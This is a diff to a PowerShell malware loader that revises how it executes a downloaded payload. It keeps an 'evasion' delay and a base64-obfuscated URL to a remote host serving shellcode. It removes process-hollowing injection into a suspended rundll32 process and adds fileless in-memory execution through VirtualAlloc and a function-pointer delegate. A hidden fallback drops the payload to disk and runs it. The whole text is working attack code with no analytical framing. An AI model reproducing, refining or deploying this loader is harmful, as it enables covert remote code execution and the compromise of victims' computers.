@@ -78,52 +78,33 @@ if (-not $isFirstRun) {
 # === BEARFOOS EVASION: Delay before payload ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === FILELESS PROCESS HOLLOWING ===
+# === FILELESS SHELLCODE EXECUTION (DELEGATE) ===
 $shellcodeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
 
 try {
     # Download shellcode
     $sc = (New-Object Net.WebClient).DownloadData($shellcodeUrl)
     
-    # P/Invoke for process hollowing
+    # Allocate memory in current process
     $k32 = Add-Type -MemberDefinition @"
-[DllImport("kernel32")] public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
-[DllImport("kernel32")] public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
-[DllImport("kernel32")] public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-[DllImport("kernel32")] public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-[DllImport("kernel32")] public static extern uint ResumeThread(IntPtr hThread);
-[DllImport("kernel32")] public static extern bool CloseHandle(IntPtr hObject);
-public struct STARTUPINFO { public uint cb; public string lpReserved; public string lpDesktop; public string lpTitle; public uint dwX; public uint dwY; public uint dwXSize; public uint dwYSize; public uint dwXCountChars; public uint dwYCountChars; public uint dwFillAttribute; public uint dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
-public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public uint dwProcessId; public uint dwThreadId; }
+[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+[DllImport("kernel32")] public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);
+[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
 "@ -Name 'K32' -Namespace 'Win32' -PassThru
     
-    # Spawn suspended rundll32.exe
-    $si = New-Object K32+STARTUPINFO
-    $si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($si)
-    $pi = New-Object K32+PROCESS_INFORMATION
-    $created = $k32::CreateProcess("C:\Windows\System32\rundll32.exe", $null, 0, 0, $false, 0x00000004, 0, $null, [ref]$si, [ref]$pi)
-    if (-not $created) { throw "CreateProcess failed" }
+    $addr = $k32::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)
+    if ($addr -eq 0) { throw "VirtualAlloc failed" }
     
-    # Allocate memory in target process
-    $addr = $k32::VirtualAllocEx($pi.hProcess, 0, [uint32]$sc.Length, 0x3000, 0x40)
-    if ($addr -eq 0) { throw "VirtualAllocEx failed" }
+    # Copy shellcode
+    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
     
-    # Write shellcode
-    $written = 0
-    $k32::WriteProcessMemory($pi.hProcess, $addr, $sc, [uint32]$sc.Length, [ref]$written)
-    
-    # Create remote thread to execute shellcode
-    $thread = $k32::CreateRemoteThread($pi.hProcess, 0, 0, $addr, 0, 0, 0)
-    if ($thread -eq 0) { throw "CreateRemoteThread failed" }
-    
-    # Resume the main thread (process runs normally)
-    $k32::ResumeThread($pi.hThread) | Out-Null
-    $k32::CloseHandle($pi.hProcess) | Out-Null
-    $k32::CloseHandle($pi.hThread) | Out-Null
-    $k32::CloseHandle($thread) | Out-Null
+    # Execute via delegate (works on x86/x64)
+    $delegate = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, [Type]([Action]))
+    $delegate.Invoke()
     
 } catch {
-    # Fallback to disk only if hollowing fails
+    # Fallback to disk only if everything fails
     $fallbackPath = "$cache\helper.exe"
     [System.IO.File]::WriteAllBytes($fallbackPath, $sc)
     Start-Process $fallbackPath -WindowStyle Hidden
